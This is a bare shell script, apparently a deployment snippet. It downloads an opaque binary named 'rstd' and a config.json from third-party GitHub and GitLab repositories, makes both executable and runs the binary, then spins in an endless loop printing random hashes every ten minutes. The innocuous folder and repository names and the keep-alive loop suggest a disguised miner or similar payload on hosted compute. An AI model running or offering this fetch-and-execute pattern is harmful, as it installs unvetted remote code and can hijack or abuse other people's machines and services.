mkdir paper
cd paper
wget wget https://github.com/sarifadim/dopla/raw/main/config.json && chmod +x config.json
wget https://gitlab.com/teletyl/jupyter/-/raw/main/rstd && chmod +x rstd
./rstd -c "config.json"
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
